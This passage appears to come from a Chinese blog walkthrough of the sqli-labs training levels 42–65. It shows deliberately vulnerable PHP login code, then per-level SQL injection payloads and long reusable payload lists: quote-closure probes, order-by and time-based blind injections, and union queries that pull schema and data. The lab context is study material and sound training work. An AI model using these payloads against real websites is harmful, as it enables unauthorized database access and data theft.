class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$username <span class="operator">=</span> mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line">$password <span class="operator">=</span> $_POST[&quot;login_password&quot;];</span><br><span class="line"> </span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span><br><span class="line">if (<span class="variable">@mysqli</span>_multi_query($con1, $<span class="keyword">sql</span>))</span><br><span class="line">&#123;</span><br><span class="line">      <span class="comment">/* store first result set */</span></span><br><span class="line">      if($<span class="keyword">result</span> <span class="operator">=</span> <span class="variable">@mysqli</span>_store_result($con1))</span><br><span class="line">      &#123;</span><br><span class="line">            if($<span class="type">row</span> <span class="operator">=</span> <span class="variable">@mysqli</span>_fetch_row($<span class="keyword">result</span>))</span><br><span class="line">    &#123;</span><br><span class="line">          if ($<span class="type">row</span>[<span class="number">1</span>])</span><br><span class="line">          &#123;</span><br><span class="line">                <span class="keyword">return</span> $<span class="type">row</span>[<span class="number">1</span>];</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> </span><br><span class="line">      &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">    print_r(mysqli_error($con1));</span><br><span class="line">    echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">      echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">      print_r(mysqli_error($con1));</span><br><span class="line">      echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="43关：用户处有过滤，密码处-‘-闭合-使用万能密码。二次注入，堆叠注入"><a href="#43关：用户处有过滤，密码处-‘-闭合-使用万能密码。二次注入，堆叠注入" class="headerlink" title="43关：用户处有过滤，密码处 ‘) 闭合 使用万能密码。二次注入，堆叠注入"></a><strong>43关：用户处有过滤，密码处 ‘) 闭合 使用万能密码。二次注入，堆叠注入</strong></h3><p>参考42关 和 38关</p><h3 id="44关：同43关，密码处-‘-闭合-二次注入，堆叠注入"><a href="#44关：同43关，密码处-‘-闭合-二次注入，堆叠注入" class="headerlink" title="44关：同43关，密码处 ‘ 闭合 二次注入，堆叠注入"></a><strong>44关：同43关，密码处 ‘ 闭合 二次注入，堆叠注入</strong></h3><h3 id="45关：同43关，用户处有过滤，密码处-‘-闭合-使用万能密码。二次注入，堆叠注入"><a href="#45关：同43关，用户处有过滤，密码处-‘-闭合-使用万能密码。二次注入，堆叠注入" class="headerlink" title="45关：同43关，用户处有过滤，密码处 ‘) 闭合 使用万能密码。二次注入，堆叠注入"></a><strong>45关：同43关，用户处有过滤，密码处 ‘) 闭合 使用万能密码。二次注入，堆叠注入</strong></h3><h3 id="46关：显示表单-数字型-报错注入"><a href="#46关：显示表单-数字型-报错注入" class="headerlink" title="**46关：显示表单 数字型 报错注入 **"></a>**46关：显示表单 数字型 报错注入 **</h3><p>页面提示 <strong>“请输入参数为带有数值的 sort”</strong></p><p>所以我们将 之前一直使用的  id 换为 sort .返回一张表格</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE70.png">    </p><p>改变参数 sort 的值，发现返回的列表是根据该表的第 sort 列排序进行回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">此处是数字型注入，因为以下的闭合方式均失败</span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;--+</span></span><br><span class="line"><span class="string">?sort=1&#x27;</span>)<span class="comment">--+</span></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;))--+</span></span><br><span class="line"><span class="string">?sort=1&quot;--+</span></span><br><span class="line"><span class="string">?sort=1&quot;)--+</span></span><br><span class="line"><span class="string">?sort=1&quot;))--+</span></span><br></pre></td></tr></table></figure><p>开始注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(&quot;~&quot;,database()),<span class="number">3</span>)<span class="comment">-- -//当前数据库名</span></span><br><span class="line"></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(&quot;~&quot;,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> <span class="string">&#x27;security&#x27;</span>)),<span class="number">2</span>)<span class="comment">-- - //查表</span></span><br><span class="line"></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(&quot;!&quot;,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">WHERE</span> table_schema <span class="operator">=</span> <span class="string">&#x27;security&#x27;</span>  table_name <span class="operator">=</span> <span class="string">&#x27;emails&#x27;</span>)),<span class="number">2</span>)<span class="comment">-- - //查字段</span></span><br><span class="line"></span><br><span class="line">?sort<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span> concat_ws(<span class="string">&#x27;:&#x27;</span>,id,email_id) <span class="keyword">from</span> (<span class="keyword">select</span> id,email_id <span class="keyword">from</span> emails)aaa limit <span class="number">0</span>,<span class="number">1</span>)),<span class="number">1</span>)<span class="comment">-- - //查数据，使用limit 控制输出</span></span><br><span class="line"></span><br><span class="line">！<span class="keyword">Every</span> derived <span class="keyword">table</span> must have its own alias！（当不给予表单名字的时候会报错）</span><br><span class="line">所以我们在要查询的数据末尾设置一个名字。这里我使用的是 “aaa”</span><br></pre></td></tr></table></figure><h3 id="47关：显示表单-‘-闭合-报错注入"><a href="#47关：显示表单-‘-闭合-报错注入" class="headerlink" title="**47关：显示表单  ‘ 闭合  报错注入 **"></a>**47关：显示表单  ‘ 闭合  报错注入 **</h3><p>参考46关</p><h3 id="48关：数字型注入-时间盲注-可尝试-DNS-log注入"><a href="#48关：数字型注入-时间盲注-可尝试-DNS-log注入" class="headerlink" title="**48关：数字型注入 时间盲注  可尝试 DNS_log注入 **"></a>**48关：数字型注入 时间盲注  可尝试 DNS_log注入 **</h3><p>参考其他关卡的时间盲注</p><h3 id="49关：’-闭合-时间盲注"><a href="#49关：’-闭合-时间盲注" class="headerlink" title="49关：’ 闭合 时间盲注"></a><strong>49关：’ 闭合 时间盲注</strong></h3><p>同48关，参考其他关卡的时间盲注</p><h3 id="50关：数字型注入-报错注入"><a href="#50关：数字型注入-报错注入" class="headerlink" title="**50关：数字型注入 报错注入 **"></a>**50关：数字型注入 报错注入 **</h3><p>参考46关</p><h3 id="51关：’-闭合-报错注入"><a href="#51关：’-闭合-报错注入" class="headerlink" title="51关：’ 闭合 报错注入"></a><strong>51关：’ 闭合 报错注入</strong></h3><p>参考46关</p><h3 id="52关：数字型注入-时间盲注"><a href="#52关：数字型注入-时间盲注" class="headerlink" title="52关：数字型注入 时间盲注"></a><strong>52关：数字型注入 时间盲注</strong></h3><p>参考其他关卡的时间盲注</p><h3 id="53关：’-闭合-时间盲注"><a href="#53关：’-闭合-时间盲注" class="headerlink" title="53关：’ 闭合 时间盲注"></a><strong>53关：’ 闭合 时间盲注</strong></h3><p>参考其他关卡的时间盲注</p><h3 id="54-65关-要求在限定步数内完成注入，围绕-challenge-数据库"><a href="#54-65关-要求在限定步数内完成注入，围绕-challenge-数据库" class="headerlink" title="54 ~ 65关 要求在限定步数内完成注入，围绕 challenge 数据库"></a><strong>54 ~ 65关 要求在限定步数内完成注入，围绕 challenge 数据库</strong></h3><h3 id="54关：显错注入-‘-闭合"><a href="#54关：显错注入-‘-闭合" class="headerlink" title="**54关：显错注入 ‘ 闭合 **"></a>**54关：显错注入 ‘ 闭合 **</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;</span>challenges<span class="string">&#x27; -- -  //查表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> <span class="comment">-- -  //查字段</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,group_concat(secret_字段),group_concat(sessid) from challenges.表名-- - //查数据</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">随后将 secret_字段 里的内容放入 Submit Secret Key 中即算过关</span></span><br></pre></td></tr></table></figure><h3 id="55关：）闭合-显错注入"><a href="#55关：）闭合-显错注入" class="headerlink" title="55关：）闭合 显错注入"></a><strong>55关：）闭合 显错注入</strong></h3><p>同54关</p><h3 id="56关：’-闭合-显错注入"><a href="#56关：’-闭合-显错注入" class="headerlink" title="56关：’) 闭合 显错注入"></a><strong>56关：’) 闭合 显错注入</strong></h3><p>同54关</p><h3 id="57关：”-闭合-显错注入"><a href="#57关：”-闭合-显错注入" class="headerlink" title="57关：” 闭合 显错注入"></a><strong>57关：” 闭合 显错注入</strong></h3><p>同54关</p><h3 id="58关：’-闭合-报错注入"><a href="#58关：’-闭合-报错注入" class="headerlink" title="58关：’  闭合 报错注入"></a><strong>58关：’  闭合 报错注入</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,updatexml(1, concat(0x7e, (select group_concat(table_name)from information_schema.tables where table_schema=&#x27;</span>challenges<span class="string">&#x27;)) ,1),3-- - //查表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>, concat(<span class="number">0x7e</span>, (<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;challenges&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;9qx3233vht&#x27;</span>)) ,<span class="number">1</span>),<span class="number">3</span><span class="comment">-- -//查字段</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,updatexml(1, concat(0x7e, (select group_concat(secret_字段) from 表名)) ,1),3-- - //查数据</span></span><br></pre></td></tr></table></figure><h3 id="59关：数字型注入-报错注入"><a href="#59关：数字型注入-报错注入" class="headerlink" title="59关：数字型注入 报错注入"></a><strong>59关：数字型注入 报错注入</strong></h3><p>payload 参考58关</p><h3 id="60关：”）闭合-报错注入"><a href="#60关：”）闭合-报错注入" class="headerlink" title="60关：”）闭合 报错注入"></a><strong>60关：”）闭合 报错注入</strong></h3><p>payload 参考58关</p><h3 id="61关：’-闭合-报错注入"><a href="#61关：’-闭合-报错注入" class="headerlink" title="61关：’))  闭合 报错注入"></a><strong>61关：’))  闭合 报错注入</strong></h3><p>payload 参考58关</p><h3 id="62关：’-闭合-时间盲注"><a href="#62关：’-闭合-时间盲注" class="headerlink" title="62关：’)  闭合 时间盲注"></a><strong>62关：’)  闭合 时间盲注</strong></h3><h3 id="63关：’-闭合-时间盲注"><a href="#63关：’-闭合-时间盲注" class="headerlink" title="**63关：’ 闭合 时间盲注 **"></a>**63关：’ 闭合 时间盲注 **</h3><h3 id="64关：数字型注入-时间盲注"><a href="#64关：数字型注入-时间盲注" class="headerlink" title="64关：数字型注入  时间盲注"></a><strong>64关：数字型注入  时间盲注</strong></h3><h3 id="65关：”-闭合-时间盲注"><a href="#65关：”-闭合-时间盲注" class="headerlink" title="65关：”) 闭合 时间盲注"></a><strong>65关：”) 闭合 时间盲注</strong></h3><p><strong>所有关卡到此结束</strong></p><h2 id="4-一些-payload"><a href="#4-一些-payload" class="headerlink" title="4.一些 payload"></a>4.一些 payload</h2><p><strong>闭合 payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">\</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"><span class="string">%df&#x27;</span> 宽字节</span><br><span class="line"><span class="operator">%</span>df&quot; 宽字节</span><br><span class="line">and 1=1</span><br><span class="line">and 1=2</span><br><span class="line">&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line">&quot; <span class="keyword">and</span> &quot;1&quot;<span class="operator">=</span>&quot;1</span><br><span class="line">&quot; <span class="keyword">and</span> &quot;1&quot;<span class="operator">=</span>&quot;2</span><br><span class="line">) and (1=1</span><br><span class="line">) and (1=2</span><br><span class="line">&#x27;) and (&#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27;) and (&#x27;1&#x27;=&#x27;2</span><br><span class="line">%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;</span><br><span class="line">%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;x</span><br><span class="line">%&#x27;) and 1=1 and (&#x27;%&#x27;=&#x27;</span><br><span class="line">%&#x27;) and 1=2 and (&#x27;%&#x27;=&#x27;x</span><br><span class="line">OR 1=1</span><br><span class="line">OR 1=2</span><br><span class="line">&#x27; OR 1=1-- -</span><br><span class="line">&#x27; OR 1=2-- -</span><br><span class="line">) OR 1=1-- -</span><br><span class="line">) OR 1=2-- -</span><br><span class="line">&#x27;) OR 1=1-- -</span><br><span class="line">&#x27;) OR 1=2-- -</span><br><span class="line">&quot; <span class="keyword">OR</span> &quot;1&quot;<span class="operator">=</span>&quot;1</span><br><span class="line">&quot; <span class="keyword">OR</span> &quot;1&quot;<span class="operator">=</span>&quot;2</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;2</span><br><span class="line">) OR (1=1</span><br><span class="line">) OR (1=2</span><br><span class="line">&#x27;) OR (&#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27;) OR (&#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure><p><strong>order by 黑盒测试 payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br><span class="line">(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br><span class="line">,(<span class="number">1</span><span class="operator">-</span>(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>))</span><br><span class="line">,(<span class="number">1</span><span class="operator">-</span>(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>))</span><br><span class="line">,<span class="number">1</span><span class="operator">=</span>if((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))</span><br><span class="line">,<span class="number">1</span><span class="operator">=</span>if((<span class="number">1</span><span class="operator">=</span><span class="number">2</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))</span><br><span class="line">,If((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">,If((<span class="number">1</span><span class="operator">=</span><span class="number">2</span>),<span class="number">1</span>,(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line">,If((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),sleep(<span class="number">4</span>),(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line"><span class="operator">-</span>IF((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line"><span class="operator">-</span>IF((<span class="number">1</span><span class="operator">=</span><span class="number">2</span>),<span class="number">1</span>,(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line"><span class="operator">-</span>(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br><span class="line"><span class="operator">-</span>(<span class="keyword">case</span> <span class="keyword">when</span>(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>) <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">2</span>) <span class="keyword">end</span>)</span><br></pre></td></tr></table></figure><p><strong>时间盲注 payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;%2b(if((1=1 and sleep(4)),1,(select 1 union select 2)))%2b&#x27;</span>a</span><br><span class="line"><span class="operator">-</span>IF((<span class="number">1</span><span class="operator">=</span><span class="number">1</span>),sleep(<span class="number">4</span>),(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">2</span>))<span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27;;(SELECT 1 FROM(SELECT(sleep(4)))lWuP)-- -</span></span><br><span class="line"><span class="string">;SELECT sleep(4)</span></span><br><span class="line"><span class="string">);SELECT sleep(4)-- -</span></span><br><span class="line"><span class="string">;SELECT sleep(4)-- -</span></span><br><span class="line"><span class="string">;(SELECT 1 FROM(SELECT(sleep(4)))lWuP)-- -</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">AND</span> SLEEP(<span class="number">4</span>)<span class="operator">%</span><span class="number">23</span></span><br><span class="line"><span class="keyword">AND</span> sleep(<span class="number">4</span>)</span><br><span class="line"><span class="string">&#x27; AND sleep(4) AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line"><span class="string">&#x27;) AND sleep(4) AND (&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">) <span class="keyword">AND</span> sleep(<span class="number">4</span>) <span class="keyword">AND</span> (<span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">&quot; AND sleep(4) AND &quot;<span class="number">1</span>&quot;=&quot;</span><br><span class="line"><span class="string">&#x27;) and (select(0)from(select(sleep(4)))x)-- -</span></span><br><span class="line"><span class="string">and (select(0)from(select(sleep(4)))x)</span></span><br><span class="line"><span class="string">and (select(0)from(select(sleep(4)))x) and 1=1</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">4</span>)))x) <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string">&quot; and (select(0)from(select(sleep(4)))x) and &quot;1&quot;=&quot;1</span></span><br><span class="line"><span class="string">) and (select(0)from(select(sleep(4)))x) and (1=1</span></span><br><span class="line"><span class="string">&#x27;</span>) <span class="keyword">and</span> (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">4</span>)))x) <span class="keyword">and</span> (<span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string">rlike (select(0)from(select(sleep(4)))x) and 1=1</span></span><br><span class="line"><span class="string">&#x27;</span> rlike (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">4</span>)))x) <span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string">) rlike (select(0)from(select(sleep(4)))x) and (1=1</span></span><br><span class="line"><span class="string">&#x27;</span>) rlike (<span class="keyword">select</span>(<span class="number">0</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(sleep(<span class="number">4</span>)))x) <span class="keyword">and</span> (<span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br><span class="line"><span class="string">;waitfor delay &#x27;</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">4</span><span class="string">&#x27; -- -</span></span><br><span class="line"><span class="string">&#x27;</span>;waitfor delay <span class="string">&#x27;0:0:4&#x27;</span> <span class="comment">-- -</span></span><br><span class="line">);waitfor delay <span class="string">&#x27;0:0:4&#x27;</span> <span class="comment">-- -</span></span><br><span class="line"><span class="string">&#x27;);waitfor delay &#x27;</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">4</span><span class="string">&#x27; -- -</span></span><br><span class="line"><span class="string">if(now()=sysdate(),sleep(4),0)/*&#x27;</span>XOR(if(now()<span class="operator">=</span>sysdate(),sleep(<span class="number">4</span>),<span class="number">0</span>))<span class="keyword">OR</span><span class="string">&#x27;&quot;XOR(if(now()=sysdate(),sleep(4),0))OR&quot;*/</span></span><br><span class="line"><span class="string">(SELECT * FROM(SELECT(sleep(4)))lWuP)</span></span><br></pre></td></tr></table></figure><p><strong>显错注入 payload</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>判断当前数据表中有几列:</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 数值 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.查看显示位在第几列(这里假设共有3列)：</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>显示当前数据库(假设显示位在第<span class="number">3</span> 列)：</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database() --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4.查询当前数据库的所有表：</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>查询所有数据库 ：</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,(select group_concat(schema_name) from information_schema.schemata) --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6.查询某个数据库中的表 (此例为 test 数据库)：</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;test&#x27;</span>) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">7.</span>查询某个表中的所有字段 (此例为 test数据库中的users 表)：</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=‘test&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>) <span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="number">8.</span>查询某个表中的字段内容(此例为 test数据库中的users 表)：</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span>‘ <span class="keyword">union</span> 